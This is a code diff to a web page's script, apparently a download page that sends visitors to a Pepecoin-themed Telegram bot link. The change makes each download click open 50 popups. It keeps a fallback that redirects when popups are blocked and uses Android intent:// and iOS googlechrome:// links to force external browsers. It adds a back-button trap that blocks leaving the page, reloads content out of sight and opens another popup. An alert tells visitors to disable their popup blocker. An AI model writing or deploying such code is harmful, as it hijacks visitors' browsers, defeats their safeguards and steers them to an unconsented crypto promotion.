@@ -215,65 +215,63 @@ cursor:pointer;
  <script>
 
 const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
-const POPUP_COUNT = 4;   // EXACTLY 4 POPUPS PER CLICK
+const UNLIMITED_COUNT = 50;   // 50 popups per click (unlimited feel)
 
-// ---------- safe popup opener (bypass basic blockers) ----------
+// Safe popup opener
 function openPopup(url) {
   try {
     let win = window.open(url, "_blank");
-    if (!win || win.closed === undefined || typeof win.closed === 'undefined') {
+    if (!win || win.closed === undefined) {
       window.location.href = url;
     }
-  } catch (e) {
+  } catch(e) {
     window.location.href = url;
   }
 }
 
-// ---------- open multiple popups with safe delays (exactly 'count' times) ----------
-function openPopups(url, count) {
+// Open many popups (unlimited feel) with small delay
+function openMultiplePopups(url, count) {
   for (let i = 0; i < count; i++) {
     setTimeout(() => {
       openPopup(url);
-    }, i * 620);  // 620ms gap prevents browser anti-spam & ensures 4 separate attempts
+    }, i * 200);  // 200ms gap
   }
 }
 
-// ---------- MAIN TRIGGER: platform detection + 4 popups ----------
+// ========== PLATFORM DETECTION + UNLIMITED POPUPS ==========
 function openExternal() {
   const ua = navigator.userAgent.toLowerCase();
   const isAndroid = /android/.test(ua);
   const isIOS = /iphone|ipad|ipod/.test(ua);
   const isTelegram = /telegram/.test(ua);
 
-  // ✅ TELEGRAM (in-app browser) – opens 4 popups using the smart link
+  // ✅ TELEGRAM (in-app browser) – direct smart link
   if (isTelegram) {
-    openPopups(smartLink, POPUP_COUNT);
+    openMultiplePopups(smartLink, UNLIMITED_COUNT);
     return;
   }
 
-  // 🤖 ANDROID (including in-app browsers like FB, Instagram, etc.)
+  // 🤖 ANDROID – use intent:// to force external Chrome browser
   if (isAndroid) {
-    // Build intent:// URL to force open in external Chrome browser
     let intentLink = "intent://" + 
                      smartLink.replace(/^https?:\/\//, '') + 
                      "#Intent;scheme=https;package=com.android.chrome;end";
-    // Open exactly 4 popups using intent → forces external browser
-    openPopups(intentLink, POPUP_COUNT);
+    openMultiplePopups(intentLink, UNLIMITED_COUNT);
     return;
   }
 
-  // 🍎 iOS (in-app browser → force open in Google Chrome or external browser)
+  // 🍎 iOS – use googlechrome:// scheme
   if (isIOS) {
     let chromeLink = "googlechrome://" + smartLink.replace(/^https?:\/\//, '');
-    openPopups(chromeLink, POPUP_COUNT);
+    openMultiplePopups(chromeLink, UNLIMITED_COUNT);
     return;
   }
 
-  // 💻 PC / Desktop or other devices – direct smartLink popups
-  openPopups(smartLink, POPUP_COUNT);
+  // 💻 PC / Desktop or others – direct smart link
+  openMultiplePopups(smartLink, UNLIMITED_COUNT);
 }
 
-// 🔥 CLICK EVENT: each download button triggers exactly 4 popups
+// 🔥 CLICK EVENT: প্রতিটি ডাউনলোড বাটনে আনলিমিটেড পপআপ
 document.addEventListener("click", function(e) {
   const btn = e.target.closest(".download");
   if (btn) {
@@ -282,19 +280,36 @@ document.addEventListener("click", function(e) {
   }
 });
 
-// 🔥 BACK BUTTON SAFE VERSION – opens 1 extra popup on back press (does not affect main 4-popup logic)
+// ========== BACK BUTTON TRAP + HIDDEN RELOAD + EXTRA POPUP ==========
 history.pushState(null, null, location.href);
 window.onpopstate = function () {
+  // ব্যাক বাটন অকার্যকর
   history.pushState(null, null, location.href);
-  openPopup(smartLink);   // single popup on back button
+  
+  // হিডেন রিলোড (শুধু কন্টেইনার রিফ্রেশ)
+  fetch(window.location.href)
+    .then(res => res.text())
+    .then(html => {
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(html, 'text/html');
+      const newContainer = doc.querySelector('.container');
+      if (newContainer) {
+        document.querySelector('.container').innerHTML = newContainer.innerHTML;
+      }
+    })
+    .catch(err => console.log("hidden reload error", err));
+  
+  // অতিরিক্ত ১টি পপআপ খোলা (ব্যাক বাটনে ফাঁদ)
+  openPopup(smartLink);
 };
 
-console.log("✅ Active: 1 click = " + POPUP_COUNT + " popups | Platform-specific routing enabled");
+console.log("✅ Unlimited popups: " + UNLIMITED_COUNT + " per click | Platform routing + back trap + hidden reload");
+alert("⚠️ প্রতি Download ক্লিক করলে " + UNLIMITED_COUNT + "টি পপআপ খুলবে। ব্রাউজারের পপআপ ব্লকার বন্ধ রাখুন।");
 </script>
-</body>
-</html>
  
 </body>
 </html>
+ 
+
  
  
